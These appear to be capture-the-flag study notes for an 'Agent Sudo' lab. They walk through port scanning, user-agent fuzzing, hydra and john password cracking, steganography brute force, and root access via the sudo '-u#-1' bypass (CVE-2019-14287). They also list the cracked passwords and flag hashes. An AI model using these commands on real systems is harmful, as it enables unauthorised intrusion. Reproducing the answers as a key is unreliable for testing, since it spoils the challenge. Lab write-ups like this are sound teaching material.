# Agent Sudo

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

### How many open ports?

- **Command:** `nmap -Pn -sV 10.10.188.212`
- **Answer:** 3
### How you redirect yourself to a secret page?

- one of the ports is http
- visit the website
- page indicates using the agent's "codename" as user-agent string to find the secret page related to that agent; the page is signed by "Agent R"
- **Answer:** "codename"
### What is the agent name?

- since the page is signed by Agent R use burpsuite intruder to check all letters of the alphabet
- letter "C" hits
- send "C" as user agent string and a new page pops ups with the name "Chris" on it
- **Answer:** Chris
## FTP password

- **Command:** `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.188.212`
- finds password: crystal
- **Answer:** crystal
## Zip file password

- **Command:** `"zip2john 8702.zip > output"`
- **Command:** `"john output"`
- **Answer:** alien
## steg password

- the text file in the zip contains the string "QXJlYTUx"
- put string into cyberchef and use magic
- "From Base64" works
- **Answer:** area51
### Who is the other agent (in full name)?

- located in the "cute-alient.jpg" file
- "file" returns valid jpg information
- "strings" returns no value
- "binwalk" indicates corruption, meaning hidden information
- "steghide extract cute-alient.jpg" requires a passsphrase
- "stegseek cutte-alient.jpg /usr/share/wordlists/rockyou.txt" reveals the hidden message
- Answer is in the message: James
## SSH password

- answer is in the message from the previous step
- **Answer:** hackerrules!
### What is the user flag?

james@agent-sudo:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
- "ls -alh"
- "cat user_flag.txt"
- **Answer:** b03d975e8c92a7c04146cfa7a5a313c7
### What is the incident of the photo called?

- from attacking device use the secure copy "scp"
- **Command:** `"scp james@<target ip>:Alien_autospy.jpg Documents/THM/AgentSudo" (the misspelling is part of the challenge)`
- requires the user of hackerrules!
- use google reverse image search
- **Answer:** Roswell Alien Autopsy
CVE number for the escalation
## (Format: CVE-xxxx-xxxx)

james@agent-sudo:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
- "cat /etc/passwd" worked; could see all the entries
- "sudo -l" indicates james can run /bin/bash
- go to exploit db and search for sudo; 28 entries
- one entry for security bypass
- **Reference:** https://www.exploit-db.com/exploits/47502
- **Answer:** CVE-2019-14287
### What is the root flag?

Command: "sudo -u#-1 /bin/bash" gives root
- change directory to the root and use cat to read the root.txt
- **Answer:** b53a02f55b57d4439e3341834d70c062
### (Bonus) Who is Agent R?

- in root.txt
- **Answer:** DesKel
